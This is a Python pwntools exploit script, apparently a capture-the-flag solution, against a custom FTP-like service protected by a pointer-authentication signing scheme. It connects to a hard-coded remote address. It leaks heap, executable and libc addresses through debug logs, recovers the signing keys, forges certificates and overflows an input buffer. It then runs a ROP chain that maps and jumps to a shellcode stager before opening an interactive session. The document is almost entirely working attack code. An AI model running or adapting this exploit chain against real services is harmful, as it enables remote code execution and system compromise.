from pwn import *
import base64
import re
from hsm_test import crypt
import subprocess
from dataclasses import dataclass

context.update(arch="amd64")

#s = remote('focal', 31500); local = True; pasv_addr = None
#s = remote('localhost', 31337); local = True; pasv_addr = ("localhost", 33344) # qemu, with local port forwarding
s = remote('62.210.131.87', 31337); local = False; pasv_addr = None

banner = s.recvline()
log.info("* %s", banner.rstrip(b"\n").decode())

def send_cmd(cmd, msg="", reply=True):
    if isinstance(cmd, str):
        cmd = cmd.encode()
    if isinstance(msg, str):
        msg = msg.encode()
    s.sendline(cmd + b" " + msg)
    if reply:
        resp = s.recvline().rstrip(b"\n").decode()
        log.info("%s => %s", cmd.decode(), resp)
        return resp

def pasv_cmd(cmd, msg=""):
    resp = send_cmd("PASV")
    addr = resp.split("(")[1].split(")")[0].split(",")
    host = ".".join(addr[:4])
    port = int(addr[4]) * 256 + int(addr[5])
    if pasv_addr:
        host, port = pasv_addr
    conn2 = remote(host, port)

    if isinstance(cmd, str):
        cmd = cmd.encode()
    resp = send_cmd(cmd, msg)
    if resp == "150 Ok":
        data = conn2.recvall()
    resp = s.recvline().rstrip(b"\n").decode()
    log.info("%s => %s", cmd.decode(), resp)

    return data

PAC_MASK = 0xffff0000_00000000

# Groom heap
user = "&user=" + "A" * 0x30
# payload = f"perms=0{user*4}&sig=0" # with malloc_preload
payload = f"perms=0{user*1}&sig=0"
payload = payload.encode()
# payload = payload.ljust(762, b"X") # maximum length

send_cmd("CERT", base64.b64encode(payload))

# Leak data from User struct
send_cmd("USER", "anon")
send_cmd("PASS", "xxxx")
send_cmd("DBG")
send_cmd("USER", "AAAABBBBCCCCDDDD")
send_cmd("DBG") # fails, need login

send_cmd("USER", "anonymous")
send_cmd("PASS", "xxxx")
send_cmd("USER", "EEEEFFFFGGGGHHHH")
send_cmd("DBG") # fails, need login
send_cmd("USER", "anonymous")

logf = pasv_cmd("RETR", "ftp.log")
leak1 = re.findall(b"(?s)User AAAABBBBCCCCDDDD(.+?) : Command", logf)[0]
leak2 = re.findall(b"(?s)User EEEEFFFFGGGGHHHH(.+?) : Command", logf)[0]
log.info("Leak 1: %s", leak1.hex())
log.info("Leak 2: %s", leak2.hex())

# Solve for keys
msg1 = u64(b"\x01anon\x00\x00\x00")
sig1 = u64(leak1[:8])
msg2 = u64(b"\x01anonymo")
sig2 = u64(leak2[:8])
ptrleak = u64(leak1[8:16])
assert ptrleak == u64(leak2[8:16]), "Sanity check fail"
exebase = (ptrleak & ~PAC_MASK) - 0x49c0

log.info("exe base: %#x", exebase)
log.info("Solving for keys with %#x=>%#x, %#x=>%#x", msg1, sig1, msg2, sig2)

if local:
    keypairs = [(123, 456)]
else:
    res = subprocess.check_output(["sage", "hsm_solve.sage", str(msg1), str(sig1), str(msg2), str(sig2)])
    keypairs = [tuple(map(int, row.split())) for row in res.strip().split(b"\n")]
for k1, k2 in keypairs:
    log.info("Candidate k1=%#x k2=%#x", k1, k2)

def sign(x, key=0):
    if isinstance(x, bytes):
        sig = 0
        for i in range(0, len(x), 8):
            chunk = u64(x[i:i+8].ljust(8, b"\0"))
            sig = crypt(chunk, sig, k1, k2)
        return sig
    return crypt(x, key, k1, k2)

def signptr(x, key=0):
    sig = sign(x, key)
    return x | (sig & PAC_MASK)

log.info("Test PAC: %x => %x (expected %x)",
    ptrleak & ~PAC_MASK, signptr(ptrleak & ~PAC_MASK), ptrleak)

# Get higher perms
for k1, k2 in keypairs:
    payload = b"perms=63&user=" + cyclic(0x60)
    sig = sign(payload)
    payload += b"&sig=%d" % sig
    resp = send_cmd("CERT", base64.b64encode(payload))
    if resp == "150 Ok":
        log.info("Confirmed k1=%#x k2=%#x", k1, k2)
        break
else:
    raise Exception("Failed to forge certificates...")

# secret = pasv_cmd("RETR", "secret.txt")
# log.info("Secret: %s", secret.decode())

# Overflow input buffer by one to switch to User auth
send_cmd(b"TYPE", b"X" * (1024 - 6))
payload = b"perms=63&user=" + cyclic(0x30)
sig = sign(payload)
payload += b"&sig=%d" % sig
resp = send_cmd("CERT", base64.b64encode(payload))
logf = pasv_cmd("RETR", "ftp.log")

heapleak = re.findall(b"Command CERT .+\nUser (......) : Command TYPE", logf)[-1]
heapleak = u64(heapleak.ljust(8, b"\0"))
heapbase = heapleak - 0x8010
log.info("heap base: %#x", heapbase)
inputaddr = heapbase + 0x5680
certaddr = heapbase + 0x5890

def setcert(authed=1, perms=0xff, username=certaddr):
    computeSig = signptr(exebase + 0x49c0) # use computeSigUser so we don't have to know what's at that address
    destructor = signptr(exebase + 0x56a0) # no-op to avoid freeing the object
    sig = sign(bytes([perms]) + p64(username)[:7])
    payload = b"X" * 0x208 + p64(0x41) + struct.pack("<QQQQQQ", authed, perms, username, sig, computeSig, destructor)
    send_cmd("CERT", base64.b64encode(payload))

# leak libc
setcert(username=exebase + 0x8e20) # getenv@got
logf = pasv_cmd("RETR", "ftp.log")
libcleak = re.findall(b"Command CERT .+\nUser (......) : Command PASV", logf)[-1]
libcleak = u64(libcleak.ljust(8, b"\0"))
libcbase = libcleak - 0x45ed0
log.info("libc base: %#x", libcbase)

pop_rdi = libcbase + 0x0007a307
pop_rsi = libcbase + 0x0007a0ff
pop_rdx_rcx_rbx = libcbase + 0x001025ad
pop_rdx_r12 = libcbase + 0x00134c09
mov_rdx_rax = libcbase + 0x000425cf
pop_rsp = libcbase + 0x00054d0d
ropspace = heapbase + 0x10000
dataspace = heapbase + 0x11000
mov_rax_rdx = libcbase + 0x000b6b18
inc_rax = libcbase + 0x000cfb20
mov_r8d_eax = libcbase + 0x0011f807
mov_r9_rax_pop_r12_r13_r14 = libcbase + 0x0007a1a0

shellcode = open("stager", "rb").read()

pause()

# fds: 0=stdin, 1=stdout, 2=stderr, 3=serial_port, 4=server_sock, 5=client_sock, 6=dbg
rop = [
    # open(filename, O_RDWR | O_CREAT, 0o666)
    pop_rdi, exebase + 0x6354, # "listen"
    pop_rsi, 0x42,
    pop_rdx_rcx_rbx, 0o666, 0, 0,
    exebase + 0x22d0,
    # read(5, dataspace, len(shellcode))
    pop_rdi, 5,
    pop_rsi, dataspace,
    pop_rdx_rcx_rbx, len(shellcode), 0, 0,
    exebase + 0x21c0,
    # write(7, dataspace, len(shellcode))
    pop_rdi, 7,
    pop_rsi, dataspace,
    pop_rdx_rcx_rbx, len(shellcode), 0, 0,
    exebase + 0x20c0,
    # mmap(NULL, len(shellcode), PROT_READ | PROT_EXEC, MAP_SHARED, 7, 0)
    pop_rdx_r12, 7, 0, mov_rax_rdx, mov_r8d_eax,
    pop_rdx_r12, 0, 0, mov_rax_rdx, mov_r9_rax_pop_r12_r13_r14, 0, 0, 0,
    pop_rdx_rcx_rbx, 5, 1, 0,
    pop_rdi, 0,
    pop_rsi, (len(shellcode) + 4095) & ~0xfff,
    libcbase + 0x1188f0,
    # jmp rax
    libcbase + 0x0007e051,
]
payload = flat(rop) + b"perms=63&user=x"
sig = sign(payload)
payload = payload.replace(b"\0", b"\n") + b"&sig=%d&" % sig
payload = payload.ljust(0x208, b"X")
assert len(payload) == 0x208
payload = payload + p64(0x41) + struct.pack("<QQQQQQ", 1, 0xff, certaddr, 0, signptr(pop_rdi), 0)
send_cmd("CERT", base64.b64encode(payload), reply=False)

s.send(shellcode)

s.recvuntil(b"ready")
sc = open("shellcode", "rb").read()
s.send(p32(len(sc)))
s.send(sc)

s.interactive()
